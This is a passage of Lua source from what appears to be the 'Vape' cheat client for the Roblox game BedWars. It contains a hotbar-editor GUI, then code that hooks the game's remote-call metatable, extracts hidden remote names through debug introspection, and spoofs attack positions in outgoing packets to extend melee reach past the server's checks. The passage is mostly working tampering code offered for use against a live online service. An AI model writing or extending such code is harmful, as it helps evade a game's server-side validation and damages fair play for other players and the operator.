	ItemListExitButtonround.CornerRadius = UDim.new(0, 16)
	ItemListExitButtonround.Parent = ItemListExitButton
	ItemListExitButton.MouseEnter:Connect(function()
		tweenService:Create(ItemListExitButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(60, 60, 60), ImageColor3 = Color3.fromRGB(255, 255, 255)}):Play()
	end)
	ItemListExitButton.MouseLeave:Connect(function()
		tweenService:Create(ItemListExitButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(26, 25, 26), ImageColor3 = Color3.fromRGB(121, 121, 121)}):Play()
	end)
	ItemListExitButton.MouseButton1Click:Connect(function()
		ItemListBigFrame.Visible = false
		GuiLibrary.MainGui.ScaledGui.ClickGui.Visible = true
	end)
	local ItemListFrameShadow = Instance.new("ImageLabel")
	ItemListFrameShadow.AnchorPoint = Vector2.new(0.5, 0.5)
	ItemListFrameShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
	ItemListFrameShadow.Image = downloadVapeAsset("vape/assets/WindowBlur.png")
	ItemListFrameShadow.BackgroundTransparency = 1
	ItemListFrameShadow.ZIndex = -1
	ItemListFrameShadow.Size = UDim2.new(1, 6, 1, 6)
	ItemListFrameShadow.ImageColor3 = Color3.new(0, 0, 0)
	ItemListFrameShadow.ScaleType = Enum.ScaleType.Slice
	ItemListFrameShadow.SliceCenter = Rect.new(10, 10, 118, 118)
	ItemListFrameShadow.Parent = ItemListFrame
	local ItemListFrameText = Instance.new("TextLabel")
	ItemListFrameText.Size = UDim2.new(1, 0, 0, 41)
	ItemListFrameText.BackgroundTransparency = 1
	ItemListFrameText.Name = "WindowTitle"
	ItemListFrameText.Position = UDim2.new(0, 0, 0, 0)
	ItemListFrameText.TextXAlignment = Enum.TextXAlignment.Left
	ItemListFrameText.Font = Enum.Font.SourceSans
	ItemListFrameText.TextSize = 17
	ItemListFrameText.Text = "    New AutoHotbar"
	ItemListFrameText.TextColor3 = Color3.fromRGB(201, 201, 201)
	ItemListFrameText.Parent = ItemListFrame
	local ItemListBorder1 = Instance.new("Frame")
	ItemListBorder1.BackgroundColor3 = Color3.fromRGB(40, 39, 40)
	ItemListBorder1.BorderSizePixel = 0
	ItemListBorder1.Size = UDim2.new(1, 0, 0, 1)
	ItemListBorder1.Position = UDim2.new(0, 0, 0, 41)
	ItemListBorder1.Parent = ItemListFrame
	local ItemListFrameCorner = Instance.new("UICorner")
	ItemListFrameCorner.CornerRadius = UDim.new(0, 4)
	ItemListFrameCorner.Parent = ItemListFrame
	local ItemListFrame1 = Instance.new("Frame")
	ItemListFrame1.Size = UDim2.new(0, 112, 0, 113)
	ItemListFrame1.Position = UDim2.new(0, 10, 0, 71)
	ItemListFrame1.BackgroundColor3 = Color3.fromRGB(38, 37, 38)
	ItemListFrame1.Name = "ItemListFrame1"
	ItemListFrame1.Parent = ItemListFrame
	local ItemListFrame2 = Instance.new("Frame")
	ItemListFrame2.Size = UDim2.new(0, 110, 0, 111)
	ItemListFrame2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	ItemListFrame2.BorderSizePixel = 0
	ItemListFrame2.Name = "ItemListFrame2"
	ItemListFrame2.Position = UDim2.new(0, 1, 0, 1)
	ItemListFrame2.Parent = ItemListFrame1
	local ItemListFramePicker = Instance.new("ScrollingFrame")
	ItemListFramePicker.Size = UDim2.new(0, 495, 0, 220)
	ItemListFramePicker.Position = UDim2.new(0, 144, 0, 122)
	ItemListFramePicker.BorderSizePixel = 0
	ItemListFramePicker.ScrollBarThickness = 3
	ItemListFramePicker.ScrollBarImageTransparency = 0.8
	ItemListFramePicker.VerticalScrollBarInset = Enum.ScrollBarInset.None
	ItemListFramePicker.BackgroundTransparency = 1
	ItemListFramePicker.Parent = ItemListFrame
	local ItemListFramePickerGrid = Instance.new("UIGridLayout")
	ItemListFramePickerGrid.CellPadding = UDim2.new(0, 4, 0, 3)
	ItemListFramePickerGrid.CellSize = UDim2.new(0, 51, 0, 52)
	ItemListFramePickerGrid.Parent = ItemListFramePicker
	ItemListFramePickerGrid:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		ItemListFramePicker.CanvasSize = UDim2.new(0, 0, 0, ItemListFramePickerGrid.AbsoluteContentSize.Y * (1 / GuiLibrary["MainRescale"].Scale))
	end)
	local ItemListcorner = Instance.new("UICorner")
	ItemListcorner.CornerRadius = UDim.new(0, 5)
	ItemListcorner.Parent = ItemListFrame1
	local ItemListcorner2 = Instance.new("UICorner")
	ItemListcorner2.CornerRadius = UDim.new(0, 5)
	ItemListcorner2.Parent = ItemListFrame2
	local selectedslot = 1
	local hoveredslot = 0
	
	local refreshslots
	local refreshList
	refreshslots = function()
		local startnum = 144
		local oldhovered = hoveredslot
		for i2,v2 in pairs(ItemListFrame:GetChildren()) do
			if v2.Name:find("ItemSlot") then
				v2:Remove()
			end
		end
		for i3,v3 in pairs(ItemListFramePicker:GetChildren()) do
			if v3:IsA("TextButton") then
				v3:Remove()
			end
		end
		for i4,v4 in pairs(sortableitems) do
			local ItemFrame = Instance.new("TextButton")
			ItemFrame.Text = ""
			ItemFrame.BackgroundColor3 = Color3.fromRGB(31, 30, 31)
			ItemFrame.Parent = ItemListFramePicker
			ItemFrame.AutoButtonColor = false
			local ItemFrameIcon = Instance.new("ImageLabel")
			ItemFrameIcon.Size = UDim2.new(0, 32, 0, 32)
			ItemFrameIcon.Image = bedwars.getIcon({itemType = v4.itemDisplayType}, true) 
			ItemFrameIcon.ResampleMode = (bedwars.getIcon({itemType = v4.itemDisplayType}, true):find("rbxasset://") and Enum.ResamplerMode.Pixelated or Enum.ResamplerMode.Default)
			ItemFrameIcon.Position = UDim2.new(0, 10, 0, 10)
			ItemFrameIcon.BackgroundTransparency = 1
			ItemFrameIcon.Parent = ItemFrame
			local ItemFramecorner = Instance.new("UICorner")
			ItemFramecorner.CornerRadius = UDim.new(0, 5)
			ItemFramecorner.Parent = ItemFrame
			ItemFrame.MouseButton1Click:Connect(function()
				for i5,v5 in pairs(buttonapi["Hotbars"][buttonapi["CurrentlySelected"]]["Items"]) do
					if v5.itemType == v4.itemType then
						buttonapi["Hotbars"][buttonapi["CurrentlySelected"]]["Items"][tostring(i5)] = nil
					end
				end
				buttonapi["Hotbars"][buttonapi["CurrentlySelected"]]["Items"][tostring(selectedslot)] = v4
				refreshslots()
				refreshList()
			end)
		end
		for i = 1, 9 do
			local item = buttonapi["Hotbars"][buttonapi["CurrentlySelected"]]["Items"][tostring(i)]
			local ItemListFrame3 = Instance.new("Frame")
			ItemListFrame3.Size = UDim2.new(0, 55, 0, 56)
			ItemListFrame3.Position = UDim2.new(0, startnum - 2, 0, 380)
			ItemListFrame3.BackgroundTransparency = (selectedslot == i and 0 or 1)
			ItemListFrame3.BackgroundColor3 = Color3.fromRGB(35, 34, 35)
			ItemListFrame3.Name = "ItemSlot"
			ItemListFrame3.Parent = ItemListFrame
			local ItemListFrame4 = Instance.new("TextButton")
			ItemListFrame4.Size = UDim2.new(0, 51, 0, 52)
			ItemListFrame4.BackgroundColor3 = (oldhovered == i and Color3.fromRGB(31, 30, 31) or Color3.fromRGB(20, 20, 20))
			ItemListFrame4.BorderSizePixel = 0
			ItemListFrame4.AutoButtonColor = false
			ItemListFrame4.Text = ""
			ItemListFrame4.Name = "ItemListFrame4"
			ItemListFrame4.Position = UDim2.new(0, 2, 0, 2)
			ItemListFrame4.Parent = ItemListFrame3
			local ItemListImage = Instance.new("ImageLabel")
			ItemListImage.Size = UDim2.new(0, 32, 0, 32)
			ItemListImage.BackgroundTransparency = 1
			local img = (item and bedwars.getIcon({itemType = item.itemDisplayType}, true) or "")
			ItemListImage.Image = img
			ItemListImage.ResampleMode = (img:find("rbxasset://") and Enum.ResamplerMode.Pixelated or Enum.ResamplerMode.Default)
			ItemListImage.Position = UDim2.new(0, 10, 0, 10)
			ItemListImage.Parent = ItemListFrame4
			local ItemListcorner3 = Instance.new("UICorner")
			ItemListcorner3.CornerRadius = UDim.new(0, 5)
			ItemListcorner3.Parent = ItemListFrame3
			local ItemListcorner4 = Instance.new("UICorner")
			ItemListcorner4.CornerRadius = UDim.new(0, 5)
			ItemListcorner4.Parent = ItemListFrame4
			ItemListFrame4.MouseEnter:Connect(function()
				ItemListFrame4.BackgroundColor3 = Color3.fromRGB(31, 30, 31)
				hoveredslot = i
			end)
			ItemListFrame4.MouseLeave:Connect(function()
				ItemListFrame4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
				hoveredslot = 0
			end)
			ItemListFrame4.MouseButton1Click:Connect(function()
				selectedslot = i
				refreshslots()
			end)
			ItemListFrame4.MouseButton2Click:Connect(function()
				buttonapi["Hotbars"][buttonapi["CurrentlySelected"]]["Items"][tostring(i)] = nil
				refreshslots()
				refreshList()
			end)
			startnum = startnum + 55
		end
	end	

	local function createHotbarButton(num, items)
		num = tonumber(num) or #buttonapi["Hotbars"] + 1
		local hotbarbutton = Instance.new("TextButton")
		hotbarbutton.Size = UDim2.new(1, 0, 0, 30)
		hotbarbutton.BackgroundTransparency = 1
		hotbarbutton.LayoutOrder = num
		hotbarbutton.AutoButtonColor = false
		hotbarbutton.Text = ""
		hotbarbutton.Parent = children3
		buttonapi["Hotbars"][num] = {["Items"] = items or {}, Object = hotbarbutton, ["Number"] = num}
		local hotbarframe = Instance.new("Frame")
		hotbarframe.BackgroundColor3 = (num == buttonapi["CurrentlySelected"] and Color3.fromRGB(54, 53, 54) or Color3.fromRGB(31, 30, 31))
		hotbarframe.Size = UDim2.new(0, 200, 0, 27)
		hotbarframe.Position = UDim2.new(0, 10, 0, 1)
		hotbarframe.Parent = hotbarbutton
		local uicorner3 = Instance.new("UICorner")
		uicorner3.CornerRadius = UDim.new(0, 5)
		uicorner3.Parent = hotbarframe
		local startpos = 11
		for i = 1, 9 do
			local item = buttonapi["Hotbars"][num]["Items"][tostring(i)]
			local hotbarbox = Instance.new("ImageLabel")
			hotbarbox.Name = i
			hotbarbox.Size = UDim2.new(0, 17, 0, 18)
			hotbarbox.Position = UDim2.new(0, startpos, 0, 5)
			hotbarbox.BorderSizePixel = 0
			hotbarbox.Image = (item and bedwars.getIcon({itemType = item.itemDisplayType}, true) or "")
			hotbarbox.ResampleMode = ((item and bedwars.getIcon({itemType = item.itemDisplayType}, true) or ""):find("rbxasset://") and Enum.ResamplerMode.Pixelated or Enum.ResamplerMode.Default)
			hotbarbox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
			hotbarbox.Parent = hotbarframe
			startpos = startpos + 18
		end
		hotbarbutton.MouseButton1Click:Connect(function()
			if buttonapi["CurrentlySelected"] == num then
				ItemListBigFrame.Visible = true
				GuiLibrary.MainGui.ScaledGui.ClickGui.Visible = false
				refreshslots()
			end
			buttonapi["CurrentlySelected"] = num
			refreshList()
		end)
		hotbarbutton.MouseButton2Click:Connect(function()
			if buttonapi["CurrentlySelected"] == num then
				buttonapi["CurrentlySelected"] = (num == 2 and 0 or 1)
			end
			table.remove(buttonapi["Hotbars"], num)
			refreshList()
		end)
	end

	refreshList = function()
		local newnum = 0
		local newtab = {}
		for i3,v3 in pairs(buttonapi["Hotbars"]) do
			newnum = newnum + 1
			newtab[newnum] = v3
		end
		buttonapi["Hotbars"] = newtab
		for i,v in pairs(children3:GetChildren()) do
			if v:IsA("TextButton") then
				v:Remove()
			end
		end
		for i2,v2 in pairs(buttonapi["Hotbars"]) do
			createHotbarButton(i2, v2["Items"])
		end
		GuiLibrary["Settings"][children2.Name..argstable["Name"].."ItemList"] = {["Type"] = "ItemList", ["Items"] = buttonapi["Hotbars"], ["CurrentlySelected"] = buttonapi["CurrentlySelected"]}
	end
	buttonapi["RefreshList"] = refreshList

	buttontext.MouseButton1Click:Connect(function()
		createHotbarButton()
	end)

	GuiLibrary["Settings"][children2.Name..argstable["Name"].."ItemList"] = {["Type"] = "ItemList", ["Items"] = buttonapi["Hotbars"], ["CurrentlySelected"] = buttonapi["CurrentlySelected"]}
	GuiLibrary.ObjectsThatCanBeSaved[children2.Name..argstable["Name"].."ItemList"] = {["Type"] = "ItemList", ["Items"] = buttonapi["Hotbars"], ["Api"] = buttonapi, Object = buttontext}

	return buttonapi
end

GuiLibrary.LoadSettingsEvent.Event:Connect(function(res)
	for i,v in pairs(res) do
		local obj = GuiLibrary.ObjectsThatCanBeSaved[i]
		if obj and v.Type == "ItemList" and obj.Api then
			obj.Api.Hotbars = v.Items
			obj.Api.CurrentlySelected = v.CurrentlySelected
			obj.Api.RefreshList()
		end
	end
end)

runFunction(function()
	local function getWhitelistedBed(bed)
		if bed then
			for i,v in pairs(playersService:GetPlayers()) do
				if v:GetAttribute("Team") and bed and bed:GetAttribute("Team"..(v:GetAttribute("Team") or 0).."NoBreak") then
					local plrtype, plrattackable = WhitelistFunctions:GetWhitelist(v)
					if not plrattackable then 
						return true
					end
				end
			end
		end
		return false
	end

	local function dumpRemote(tab)
		for i,v in pairs(tab) do
			if v == "Client" then
				return tab[i + 1]
			end
		end
		return ""
	end

	local KnitGotten, KnitClient
	repeat
		KnitGotten, KnitClient = pcall(function()
			return debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
		end)
		if KnitGotten then break end
		task.wait()
	until KnitGotten
	repeat task.wait() until debug.getupvalue(KnitClient.Start, 1)
	local Flamework = require(replicatedStorageService["rbxts_include"]["node_modules"]["@flamework"].core.out).Flamework
	local Client = require(replicatedStorageService.TS.remotes).default.Client
	local InventoryUtil = require(replicatedStorageService.TS.inventory["inventory-util"]).InventoryUtil
	local oldRemoteGet = getmetatable(Client).Get

	getmetatable(Client).Get = function(self, remoteName)
		if not vapeInjected then return oldRemoteGet(self, remoteName) end
		local originalRemote = oldRemoteGet(self, remoteName)
		if remoteName == "DamageBlock" then
			return {
				CallServerAsync = function(self, tab)
					local hitBlock = bedwars.BlockController:getStore():getBlockAt(tab.blockRef.blockPosition)
					if hitBlock and hitBlock.Name == "bed" then
						if getWhitelistedBed(hitBlock) then
							return {andThen = function(self, func) 
								func("failed")
							end}
						end
					end
					return originalRemote:CallServerAsync(tab)
				end,
				CallServer = function(self, tab)
					local hitBlock = bedwars.BlockController:getStore():getBlockAt(tab.blockRef.blockPosition)
					if hitBlock and hitBlock.Name == "bed" then
						if getWhitelistedBed(hitBlock) then
							return {andThen = function(self, func) 
								func("failed")
							end}
						end
					end
					return originalRemote:CallServer(tab)
				end
			}
		elseif remoteName == bedwars.AttackRemote then
			return {
				instance = originalRemote.instance,
				SendToServer = function(self, attackTable, ...)
					local suc, plr = pcall(function() return playersService:GetPlayerFromCharacter(attackTable.entityInstance) end)
					if suc and plr then
						local playertype, playerattackable = WhitelistFunctions:GetWhitelist(plr)
						if not playerattackable then 
							return nil 
						end
						if Reach.Enabled then
							local attackMagnitude = ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - attackTable.validate.targetPosition.value).magnitude
							if attackMagnitude > 18 then
								return nil 
							end
							attackTable.validate.selfPosition = attackValue(attackTable.validate.selfPosition.value + (attackMagnitude > 14.4 and (CFrame.lookAt(attackTable.validate.selfPosition.value, attackTable.validate.targetPosition.value).lookVector * 4) or Vector3.zero))
						end
						bedwarsStore.attackReach = math.floor((attackTable.validate.selfPosition.value - attackTable.validate.targetPosition.value).magnitude * 100) / 100
						bedwarsStore.attackReachUpdate = tick() + 1
					end
					return originalRemote:SendToServer(attackTable, ...)
				end
			}
		end
		return originalRemote
	end

	bedwars = {
		AnimationType = require(replicatedStorageService.TS.animation["animation-type"]).AnimationType,
		AnimationUtil = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out["shared"].util["animation-util"]).AnimationUtil,
		AppController = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.client.controllers["app-controller"]).AppController,
		AbilityController = Flamework.resolveDependency("@easy-games/game-core:client/controllers/ability/ability-controller@AbilityController"),
		AbilityUIController = 	Flamework.resolveDependency("@easy-games/game-core:client/controllers/ability/ability-ui-controller@AbilityUIController"),
		AttackRemote = dumpRemote(debug.getconstants(KnitClient.Controllers.SwordController.sendServerRequest)),
		BalloonController = KnitClient.Controllers.BalloonController,
		BalanceFile = require(replicatedStorageService.TS.balance["balance-file"]).BalanceFile,
		BatteryEffectController = KnitClient.Controllers.BatteryEffectsController,
		BatteryRemote = dumpRemote(debug.getconstants(debug.getproto(debug.getproto(KnitClient.Controllers.BatteryController.KnitStart, 1), 1))),
		BlockBreaker = KnitClient.Controllers.BlockBreakController.blockBreaker,
		BlockController = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out).BlockEngine,
		BlockCpsController = KnitClient.Controllers.BlockCpsController,
		BlockPlacer = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out.client.placement["block-placer"]).BlockPlacer,
		BlockEngine = require(lplr.PlayerScripts.TS.lib["block-engine"]["client-block-engine"]).ClientBlockEngine,
		BlockEngineClientEvents = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out.client["block-engine-client-events"]).BlockEngineClientEvents,
		BlockPlacementController = KnitClient.Controllers.BlockPlacementController,
		BowConstantsTable = debug.getupvalue(KnitClient.Controllers.ProjectileController.enableBeam, 6),
		ProjectileController = KnitClient.Controllers.ProjectileController,
		ChestController = KnitClient.Controllers.ChestController,
		CannonHandController = KnitClient.Controllers.CannonHandController,
		CannonAimRemote = dumpRemote(debug.getconstants(debug.getproto(KnitClient.Controllers.CannonController.startAiming, 5))),
		CannonLaunchRemote = dumpRemote(debug.getconstants(KnitClient.Controllers.CannonHandController.launchSelf)),
		ClickHold = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.client.ui.lib.util["click-hold"]).ClickHold,
		ClientHandler = Client,
		ClientConstructor = require(replicatedStorageService["rbxts_include"]["node_modules"]["@rbxts"].net.out.client),
		ClientHandlerDamageBlock = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out.shared.remotes).BlockEngineRemotes.Client,
		ClientStoreHandler = require(lplr.PlayerScripts.TS.ui.store).ClientStore,
		CombatConstant = require(replicatedStorageService.TS.combat["combat-constant"]).CombatConstant,
		CombatController = KnitClient.Controllers.CombatController,
		ConstantManager = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out["shared"].constant["constant-manager"]).ConstantManager,
		ConsumeSoulRemote = dumpRemote(debug.getconstants(KnitClient.Controllers.GrimReaperController.consumeSoul)),
		CooldownController = Flamework.resolveDependency("@easy-games/game-core:client/controllers/cooldown/cooldown-controller@CooldownController"),
		DamageIndicator = KnitClient.Controllers.DamageIndicatorController.spawnDamageIndicator,
		DamageIndicatorController = KnitClient.Controllers.DamageIndicatorController,
		DefaultKillEffect = require(lplr.PlayerScripts.TS.controllers.game.locker["kill-effect"].effects["default-kill-effect"]),
		DropItem = KnitClient.Controllers.ItemDropController.dropItemInHand,
		DropItemRemote = dumpRemote(debug.getconstants(KnitClient.Controllers.ItemDropController.dropItemInHand)),
		DragonSlayerController = KnitClient.Controllers.DragonSlayerController,
		DragonRemote = dumpRemote(debug.getconstants(debug.getproto(debug.getproto(KnitClient.Controllers.DragonSlayerController.KnitStart, 2), 1))),
		EatRemote = dumpRemote(debug.getconstants(debug.getproto(KnitClient.Controllers.ConsumeController.onEnable, 1))),
		EquipItemRemote = dumpRemote(debug.getconstants(debug.getproto(require(replicatedStorageService.TS.entity.entities["inventory-entity"]).InventoryEntity.equipItem, 3))),
		EmoteMeta = require(replicatedStorageService.TS.locker.emote["emote-meta"]).EmoteMeta,
		FishermanTable = KnitClient.Controllers.FishermanController,
		FovController = KnitClient.Controllers.FovController,
		ForgeController = KnitClient.Controllers.ForgeController,
		ForgeConstants = debug.getupvalue(KnitClient.Controllers.ForgeController.getPurchaseableForgeUpgrades, 2),
		ForgeUtil = debug.getupvalue(KnitClient.Controllers.ForgeController.getPurchaseableForgeUpgrades, 5),
		GameAnimationUtil = require(replicatedStorageService.TS.animation["animation-util"]).GameAnimationUtil,
		EntityUtil = require(replicatedStorageService.TS.entity["entity-util"]).EntityUtil,
		getIcon = function(item, showinv)
			local itemmeta = bedwars.ItemTable[item.itemType]
			if itemmeta and showinv then
				return itemmeta.image or ""
			end
			return ""
		end,
		getInventory = function(plr)
			local suc, result = pcall(function() 
				return InventoryUtil.getInventory(plr) 
			end)
			return (suc and result or {
				items = {},
				armor = {},
				hand = nil
			})
		end,
		GrimReaperController = KnitClient.Controllers.GrimReaperController,
		GuitarHealRemote = dumpRemote(debug.getconstants(KnitClient.Controllers.GuitarController.performHeal)),
		HangGliderController = KnitClient.Controllers.HangGliderController,
		HighlightController = KnitClient.Controllers.EntityHighlightController,
		ItemTable = debug.getupvalue(require(replicatedStorageService.TS.item["item-meta"]).getItemMeta, 1),
		InfernalShieldController = KnitClient.Controllers.InfernalShieldController,
		KatanaController = KnitClient.Controllers.DaoController,
		KillEffectMeta = require(replicatedStorageService.TS.locker["kill-effect"]["kill-effect-meta"]).KillEffectMeta,
		KillEffectController = KnitClient.Controllers.KillEffectController,
		KnockbackUtil = require(replicatedStorageService.TS.damage["knockback-util"]).KnockbackUtil,
		LobbyClientEvents = KnitClient.Controllers.QueueController,
		MapController = KnitClient.Controllers.MapController,
		MatchEndScreenController = Flamework.resolveDependency("client/controllers/game/match/match-end-screen-controller@MatchEndScreenController"),
		MinerRemote = dumpRemote(debug.getconstants(debug.getproto(KnitClient.Controllers.MinerController.onKitEnabled, 1))),
		MageRemote = dumpRemote(debug.getconstants(debug.getproto(KnitClient.Controllers.MageController.registerTomeInteraction, 1))),
		MageKitUtil = require(replicatedStorageService.TS.games.bedwars.kit.kits.mage["mage-kit-util"]).MageKitUtil,
		MageController = KnitClient.Controllers.MageController,
		MissileController = KnitClient.Controllers.GuidedProjectileController,
		PickupMetalRemote = dumpRemote(debug.getconstants(debug.getproto(debug.getproto(KnitClient.Controllers.MetalDetectorController.KnitStart, 1), 2))),
		PickupRemote = dumpRemote(debug.getconstants(KnitClient.Controllers.ItemDropController.checkForPickup)),
		ProjectileMeta = require(replicatedStorageService.TS.projectile["projectile-meta"]).ProjectileMeta,
		ProjectileRemote = dumpRemote(debug.getconstants(debug.getupvalue(KnitClient.Controllers.ProjectileController.launchProjectileWithValues, 2))),
		QueryUtil = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out).GameQueryUtil,
		QueueCard = require(lplr.PlayerScripts.TS.controllers.global.queue.ui["queue-card"]).QueueCard,
		QueueMeta = require(replicatedStorageService.TS.game["queue-meta"]).QueueMeta,
		RavenTable = KnitClient.Controllers.RavenController,
		RelicController = KnitClient.Controllers.RelicVotingController,
		ReportRemote = dumpRemote(debug.getconstants(require(lplr.PlayerScripts.TS.controllers.global.report["report-controller"]).default.reportPlayer)),
		ResetRemote = dumpRemote(debug.getconstants(debug.getproto(KnitClient.Controllers.ResetController.createBindable, 1))),
		Roact = require(replicatedStorageService["rbxts_include"]["node_modules"]["@rbxts"]["roact"].src),
		RuntimeLib = require(replicatedStorageService["rbxts_include"].RuntimeLib),
		ScytheController = KnitClient.Controllers.ScytheController,
		Shop = require(replicatedStorageService.TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop,
		ShopItems = debug.getupvalue(debug.getupvalue(require(replicatedStorageService.TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop.getShopItem, 1), 3),
		SoundList = require(replicatedStorageService.TS.sound["game-sound"]).GameSound,
		SoundManager = require(replicatedStorageService["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out).SoundManager,
		SpawnRavenRemote = dumpRemote(debug.getconstants(KnitClient.Controllers.RavenController.spawnRaven)),
		SprintController = KnitClient.Controllers.SprintController,
		StopwatchController = KnitClient.Controllers.StopwatchController,
		SwordController = KnitClient.Controllers.SwordController,
		TreeRemote = dumpRemote(debug.getconstants(debug.getproto(debug.getproto(KnitClient.Controllers.BigmanController.KnitStart, 1), 2))),
		TrinityRemote = dumpRemote(debug.getconstants(debug.getproto(KnitClient.Controllers.AngelController.onKitEnabled, 1))),
		TopBarController = KnitClient.Controllers.TopBarController,
		ViewmodelController = KnitClient.Controllers.ViewmodelController,
		WeldTable = require(replicatedStorageService.TS.util["weld-util"]).WeldUtil,
		ZephyrController = KnitClient.Controllers.WindWalkerController
	}

	bedwarsStore.blockPlacer = bedwars.BlockPlacer.new(bedwars.BlockEngine, "wool_white")
	bedwars.placeBlock = function(speedCFrame, customblock)
		if getItem(customblock) then
			bedwarsStore.blockPlacer.blockType = customblock
			return bedwarsStore.blockPlacer:placeBlock(Vector3.new(speedCFrame.X / 3, speedCFrame.Y / 3, speedCFrame.Z / 3))
		end
	end

	local healthbarblocktable = {
		blockHealth = -1,
		breakingBlockPosition = Vector3.zero
	}

	local failedBreak = 0
	bedwars.breakBlock = function(pos, effects, normal, bypass, anim)
		if GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled then 
			return
		end
		if lplr:GetAttribute("DenyBlockBreak") then
			return
		end
		local block, blockpos = nil, nil
		if not bypass then block, blockpos = getLastCovered(pos, normal) end
		if not block then block, blockpos = getPlacedBlock(pos) end
		if blockpos and block then
			if bedwars.BlockEngineClientEvents.DamageBlock:fire(block.Name, blockpos, block):isCancelled() then
				return
			end
			local blockhealthbarpos = {blockPosition = Vector3.zero}
			local blockdmg = 0
			if block and block.Parent ~= nil then
				if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - (blockpos * 3)).magnitude > 30 then return end
				bedwarsStore.blockPlace = tick() + 0.1
				switchToAndUseTool(block)
				blockhealthbarpos = {
					blockPosition = blockpos
				}
				task.spawn(function()
					bedwars.ClientHandlerDamageBlock:Get("DamageBlock"):CallServerAsync({
						blockRef = blockhealthbarpos, 
						hitPosition = blockpos * 3, 
						hitNormal = Vector3.FromNormalId(normal)
					}):andThen(function(result)
						if result ~= "failed" then
							failedBreak = 0
							if healthbarblocktable.blockHealth == -1 or blockhealthbarpos.blockPosition ~= healthbarblocktable.breakingBlockPosition then
								local blockdata = bedwars.BlockController:getStore():getBlockData(blockhealthbarpos.blockPosition)
								local blockhealth = blockdata and blockdata:GetAttribute(lplr.Name .. "_Health") or block:GetAttribute("Health")
								healthbarblocktable.blockHealth = blockhealth
								healthbarblocktable.breakingBlockPosition = blockhealthbarpos.blockPosition
							end
							healthbarblocktable.blockHealth = result == "destroyed" and 0 or healthbarblocktable.blockHealth
							blockdmg = bedwars.BlockController:calculateBlockDamage(lplr, blockhealthbarpos)
							healthbarblocktable.blockHealth = math.max(healthbarblocktable.blockHealth - blockdmg, 0)
							if effects then
								bedwars.BlockBreaker:updateHealthbar(blockhealthbarpos, healthbarblocktable.blockHealth, block:GetAttribute("MaxHealth"), blockdmg, block)
								if healthbarblocktable.blockHealth <= 0 then
									bedwars.BlockBreaker.breakEffect:playBreak(block.Name, blockhealthbarpos.blockPosition, lplr)
									bedwars.BlockBreaker.healthbarMaid:DoCleaning()
									healthbarblocktable.breakingBlockPosition = Vector3.zero
								else
									bedwars.BlockBreaker.breakEffect:playHit(block.Name, blockhealthbarpos.blockPosition, lplr)
								end
							end
							local animation
							if anim then
								animation = bedwars.AnimationUtil:playAnimation(lplr, bedwars.BlockController:getAnimationController():getAssetId(1))
								bedwars.ViewmodelController:playAnimation(15)
							end
							task.wait(0.3)
							if animation ~= nil then
								animation:Stop()
								animation:Destroy()
							end
						else
							failedBreak = failedBreak + 1
						end
					end)
				end)
				task.wait(physicsUpdate)
			end
		end
	end	

	local function updateStore(newStore, oldStore)
		if newStore.Game ~= oldStore.Game then 
			bedwarsStore.matchState = newStore.Game.matchState
			bedwarsStore.queueType = newStore.Game.queueType or "bedwars_test"
			bedwarsStore.forgeMasteryPoints = newStore.Game.forgeMasteryPoints
			bedwarsStore.forgeUpgrades = newStore.Game.forgeUpgrades
		end
		if newStore.Bedwars ~= oldStore.Bedwars then 
			bedwarsStore.equippedKit = newStore.Bedwars.kit ~= "none" and newStore.Bedwars.kit or ""
		end
		if newStore.Inventory ~= oldStore.Inventory then
			local newInventory = (newStore.Inventory and newStore.Inventory.observedInventory or {inventory = {}})
			local oldInventory = (oldStore.Inventory and oldStore.Inventory.observedInventory or {inventory = {}})
			bedwarsStore.localInventory = newStore.Inventory.observedInventory
			if newInventory ~= oldInventory then
				vapeEvents.InventoryChanged:Fire()
			end
			if newInventory.inventory.items ~= oldInventory.inventory.items then
				vapeEvents.InventoryAmountChanged:Fire()
			end
			if newInventory.inventory.hand ~= oldInventory.inventory.hand then 
				local currentHand = newStore.Inventory.observedInventory.inventory.hand
				local handType = ""
				if currentHand then
					local handData = bedwars.ItemTable[currentHand.itemType]
					handType = handData.sword and "sword" or handData.block and "block" or currentHand.itemType:find("bow") and "bow"
				end
				bedwarsStore.localHand = {tool = currentHand and currentHand.tool, Type = handType, amount = currentHand and currentHand.amount or 0}
			end
		end
	end

	table.insert(vapeConnections, bedwars.ClientStoreHandler.changed:connect(updateStore))
	updateStore(bedwars.ClientStoreHandler:getState(), {})

	for i, v in pairs({"MatchEndEvent", "EntityDeathEvent", "EntityDamageEvent", "BedwarsBedBreak", "BalloonPopped", "AngelProgress"}) do 
		bedwars.ClientHandler:WaitFor(v):andThen(function(connection)
			table.insert(vapeConnections, connection:Connect(function(...)
				vapeEvents[v]:Fire(...)
			end))
		end)
	end
	for i, v in pairs({"PlaceBlockEvent", "BreakBlockEvent"}) do 
		bedwars.ClientHandlerDamageBlock:WaitFor(v):andThen(function(connection)
